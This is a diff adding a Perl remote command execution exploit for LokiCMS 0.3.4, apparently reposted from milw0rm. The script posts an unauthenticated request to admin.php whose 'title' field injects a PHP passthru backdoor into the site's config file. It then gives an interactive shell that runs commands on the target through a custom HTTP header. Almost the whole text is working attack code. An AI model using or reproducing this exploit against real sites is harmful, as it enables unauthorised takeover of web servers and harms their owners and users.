@@ -1,0 +1,73 @@
+# Author:    __GiReX__	
+# Homepage:  http://girex.altervista.org
+
+# CMS:       LokiCMS 0.3.4
+# URL:       http://www.lokicms.com/
+
+# Description:  LokiCMS is still vulnerable to Remote Command Execution (see: http://milw0rm.com/exploits/5408)
+# The exploit changed becouse the vars changed but the bugged function is the same: writeconfig()
+# LokiCMS does not check the access to admin.php via POST...
+
+#!/usr/bin/perl -w
+# LokiCMS <= 0.3.4 Remote Command Execution Exploit
+# Needs with magic_quotes_gpc = Off
+# Coded by __GiReX__
+
+use LWP::UserAgent;
+
+if(not defined $ARGV[0])
+{
+     banner();
+     print "[-] Usage: perl $0 [host] [path]\n";
+     print "[-] Example: perl $0 localhost /lokicms/\n\n";
+     exit;
+}
+
+my $lwp = new LWP::UserAgent or die;
+ 
+my $target  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  'http://' . $ARGV[0];
+   $target .=  $ARGV[1] unless not defined $ARGV[1];
+   $target .= '/' unless $target =~ /^http:\/\/(.?)\/$/;
+
+banner();
+my $res = $lwp->post($target.'admin.php', 
+                                [ 'LokiACTION' =>  'A_SAVE_G_SETTINGS',
+                                  'title'      =>  "';echo \"<!-- INFECTED -->\";if(strlen(\$_SERVER['HTTP_CMD']))".
+                                                   "passthru(\$_SERVER['HTTP_CMD']);//", 
+                                  'language'   =>  'english-utf-8',
+                                  'theme'      =>  'default' ]);
+
+if($res->is_error)
+{
+    print "[-] Request mistake. Exploit terminated!\n";
+    exit ();
+}
+							  
+while(1)
+{
+    print "[+] shell:~\$ ";
+    chomp($cmd = <STDIN>);
+    last if $cmd eq 'exit';
+     
+    $lwp->default_header( 'CMD' => $cmd );
+    my $res = $lwp->get($target.'includes/Config.php');
+	 
+    if($res->is_success and $res->content =~ /INFECTED/)
+    {
+        print "\n". substr($res->content, index($res->content, 'INFECTED') + 12)."\n";
+    }
+    else
+    {
+        print "[-] PHP Code not injected. maybe magic_quotes_gpc = On!\n";
+        last;
+    }
+}
+
+sub banner
+{
+     print "[+] LokiCMS 0.3.4 Remote Command Execution Exploit\n";
+     print "[+] Coded by __GiReX__\n";
+     print "\n";
+}
+
+# milw0rm.com [2008-10-13]
